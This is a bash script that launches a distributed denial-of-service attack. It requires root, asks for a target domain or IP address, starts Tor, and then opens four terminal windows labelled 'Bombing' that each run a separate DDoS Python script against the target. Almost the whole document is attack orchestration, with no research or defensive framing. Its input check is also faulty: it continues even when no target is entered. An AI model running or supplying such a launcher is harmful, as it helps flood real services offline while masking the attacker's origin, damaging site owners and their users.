#!/bin/bash
#colors

red='\e[1;31m%s\e[0m\n'
green='\e[1;32m%s\e[0m\n'
yellow='\e[1;33m%s\e[0m\n'
blue='\e[1;34m%s\e[0m\n'
magenta='\e[1;35m%s\e[0m\n'
cyan='\e[1;36m%s\e[0m\n'
sleep 3
clear

if [ $EUID -ne 0 ]; then # Super User Check
  echo -e "\\033[31mAborted, please execute the script as root.\\033[0m"; exit 1
fi
printf "$red" "ENTER YOUR TARGET DOMAIN NAME OR IP ADDRESS"
read ip
echo ""
# Check if the input is empty
if [[ -n "$ip" ]]; then
    echo "......./////////......."
else
    echo "Please enter a valid input to continue."
fi

clear
###
# Function to perform the next step
next_step() {
    echo "Proceeding to the next step..."
    # Add your next step logic here
}
echo ""
printf "$green" "Processing===============>  "
sleep 2
printf "$green"                         "====================>"
sleep 3
clear
echo ""
echo ""

printf "$yellow" "close all the tab to stop....."
 sudo xterm -T ..Tor_service_start.. -hold -e sudo tor & sudo xterm -fn 6x10 -geometry 96x24+0-0 -T Bombing-1. -hold -e python3 Danger_DDos.py -s $ip & sudo xterm -fn 6x10 -geometry 96x24-0+0 -T Bombing-2.. -hold -e python3 Danger_DDos.py -s $ip & sudo xterm -fn 6x10 -geometry 96x24+0+0 -T Bombing-3... -hold -e python3 Danger_DDos.py -s $ip & sudo xterm -fn 6x10 -geometry 96x24-0-0 -T Bombing-4... -hold -e python3 Danger_DDos.py -s $ip &
echo "thank you..."
